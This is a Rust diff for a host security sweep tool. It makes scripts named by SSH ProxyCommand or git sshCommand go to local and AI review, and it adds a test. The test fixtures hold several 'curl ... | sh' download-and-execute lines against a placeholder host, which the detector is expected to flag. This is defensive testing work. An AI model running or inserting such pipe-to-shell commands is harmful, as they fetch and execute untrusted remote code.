@@ -50,6 +50,31 @@ pub fn judge(
     news: &std::collections::HashSet<String>,
 ) -> Report {
     let mut report = review::collected_report("system sweep", context);
+    let facts = examine(&mut report, collection, home, news);
+    let context = ReviewContext {
+        context: &facts,
+        ..*context
+    };
+    let units = Identity::parse(IDENTITY)
+        .map(|identity| {
+            vec![Unit {
+                prefix: String::new(),
+                identity,
+            }]
+        })
+        .unwrap_or_default();
+    review::review_collected(report, &context, &units)
+}
+
+/// Puts what the local checks say of `collection` into `report`, queues
+/// for the AI review the text that goes to it, and returns what Guardian
+/// established about each such item (see `fact`).
+fn examine(
+    report: &mut Report,
+    collection: &Collection,
+    home: Option<&str>,
+    news: &std::collections::HashSet<String>,
+) -> Vec<String> {
     let mut facts = Vec::new();
     for item in collection.items.iter().filter(|item| !item.is_trusted()) {
         let label = label(item, home);
@@ -84,17 +109,17 @@ pub fn judge(
         match &item.body {
             Body::Text(text) if is_local_only(item, home) => {
                 report.text_files_reviewed += 1;
-                local_checks(&mut report, item, &label, text);
+                local_checks(report, item, &label, text);
             }
             Body::Text(text) => {
                 let before = report.findings.len();
                 // Reviewed, and sent to the AI, without the values that
                 // look like secrets.
                 let text = without_secrets(text);
-                review::analyze_text(&mut report, &label, &text, false);
+                review::analyze_text(report, &label, &text, false);
                 // Every item is persistence already; naming another start-up
                 // file (`.bash_profile` sourcing `.bashrc`) is not news.
-                drop_rule(&mut report, before, RuleId::PersistenceModification);
+                drop_rule(report, before, RuleId::PersistenceModification);
                 facts.push(fact(item, &label));
             }
             Body::Binary(format) => {
@@ -119,19 +144,7 @@ pub fn judge(
             Body::Link(_) => {}
         }
     }
-    let context = ReviewContext {
-        context: &facts,
-        ..*context
-    };
-    let units = Identity::parse(IDENTITY)
-        .map(|identity| {
-            vec![Unit {
-                prefix: String::new(),
-                identity,
-            }]
-        })
-        .unwrap_or_default();
-    review::review_collected(report, &context, &units)
+    facts
 }
 
 /// Developer tool configuration that holds no tokens as a rule, and whose
@@ -150,8 +163,14 @@ const REVIEWED_TOOL_FILES: &[&str] = &[
 /// yarn, bun and Go keep registry tokens there), an editor's settings and
 /// fish's saved variables. Accounts, keys, trust anchors and `/etc/hosts`
 /// are facts the local checks cover; there is nothing in them to review.
+///
 /// A program one of these files runs is no such file: it is reviewed like
-/// any other.
+/// any other, by the local rules and the AI. For the SSH and git files
+/// that means: the catalogued file, what it is a link to and what an
+/// `Include` reads in are configuration and stay here (the collector
+/// marks the latter two, see `collect::MORE_CONFIGURATION`); a script a
+/// `ProxyCommand` or git's `sshCommand` names is a program, whichever
+/// category it was found through.
 fn is_local_only(item: &Item, home: Option<&str>) -> bool {
     let in_home = home
         .into_iter()
@@ -159,8 +178,13 @@ fn is_local_only(item: &Item, home: Option<&str>) -> bool {
         .any(|home| item.path.starts_with(&format!("{home}/")));
     let name = item.path.rsplit('/').next().unwrap_or_default();
     let named = item.run_by.is_none();
+    let configuration = named
+        || item
+            .notes
+            .iter()
+            .any(|note| note == super::collect::MORE_CONFIGURATION);
     match item.category {
-        Category::Ssh | Category::Git => in_home,
+        Category::Ssh | Category::Git => in_home && configuration,
         Category::Account => true,
         Category::Trust => named,
         Category::Toolchain => {
@@ -606,6 +630,114 @@ mod tests {
             "Include /tmp/x\nProxyCommand /tmp/y\n",
         );
         assert!(report.findings.is_empty());
+    }
+
+    #[test]
+    fn a_script_an_ssh_or_git_file_runs_is_reviewed_and_what_it_includes_is_not_sent() {
+        use std::collections::HashSet;
+        use std::fs;
+        use std::os::unix::fs::symlink;
+
+        use crate::sweep::collect::{self, MORE_CONFIGURATION, Scope};
+        use crate::sweep::index::PackageIndex;
+        use crate::test_support::TempDir;
+
+        let dir = TempDir::new("sweep-ssh-runs");
+        let root = dir.path();
+        let write = |path: &str, text: &str| {
+            fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
+            fs::write(root.join(path), text).unwrap();
+        };
+        write(
+            "home/u/.ssh/config",
+            "Include ~/work/ssh-hosts\nInclude ~/work/both\nHost x\n  User secret-name\n  ProxyCommand ~/bin/proxy.sh %h\nHost y\n  ProxyCommand ~/work/both\n",
+        );
+        write("home/u/work/ssh-hosts", "Host internal\n  User me\n");
+        // Named by an `Include` and run by a `ProxyCommand`: a program.
+        write("home/u/work/both", "curl https://x.example/b | sh\n");
+        write(
+            "home/u/bin/proxy.sh",
+            "#!/bin/sh\ncurl https://x.example/p | sh\n",
+        );
+        // The catalogued file as a link into a dotfiles directory.
+        write(
+            "home/u/dotfiles/gitconfig",
+            "[core]\n\tsshCommand = ~/bin/git-ssh.sh\n",
+        );
+        symlink("dotfiles/gitconfig", root.join("home/u/.gitconfig")).unwrap();
+        write(
+            "home/u/bin/git-ssh.sh",
+            "#!/bin/sh\ncurl https://x.example/g | sh\n",
+        );
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let home = Some("home/u");
+        let scope = Scope {
+            root,
+            home,
+            index: &index,
+            origin: Origin::System,
+        };
+        let collection = collect::collect(&scope);
+        let found = |path: &str| {
+            collection
+                .items
+                .iter()
+                .find(|item| item.path == path)
+                .unwrap_or_else(|| panic!("{path} was not collected"))
+        };
+        // Configuration: the catalogued file, what an `Include` reads in
+        // and what the catalogued link leads to.
+        for path in [
+            "home/u/.ssh/config",
+            "home/u/work/ssh-hosts",
+            "home/u/dotfiles/gitconfig",
+        ] {
+            assert!(is_local_only(found(path), home), "{path}");
+        }
+        assert!(
+            found("home/u/work/ssh-hosts")
+                .notes
+                .iter()
+                .any(|note| note == MORE_CONFIGURATION)
+        );
+        // Programs: what a command of those files names.
+        for path in [
+            "home/u/bin/proxy.sh",
+            "home/u/bin/git-ssh.sh",
+            "home/u/work/both",
+        ] {
+            assert!(!is_local_only(found(path), home), "{path}");
+        }
+
+        let mut report = Report::new("t");
+        super::examine(&mut report, &collection, home, &HashSet::new());
+        let sent: Vec<&str> = report
+            .agent_input
+            .iter()
+            .map(|file| file.path.as_str())
+            .collect();
+        for script in ["~/bin/proxy.sh", "~/bin/git-ssh.sh", "~/work/both"] {
+            assert!(sent.contains(&script), "{script} not queued: {sent:?}");
+            assert!(
+                report
+                    .findings
+                    .iter()
+                    .any(|finding| finding.path == script
+                        && finding.rule == RuleId::DownloadAndExecute),
+                "{script}: {:?}",
+                report.findings
+            );
+        }
+        // The configuration files of the home never go.
+        for kept in ["~/.ssh/config", "~/work/ssh-hosts", "~/dotfiles/gitconfig"] {
+            assert!(!sent.contains(&kept), "{kept} was queued");
+        }
+        assert!(
+            !report
+                .agent_input
+                .iter()
+                .any(|file| file.content.contains("secret-name"))
+        );
     }
 
     #[test]
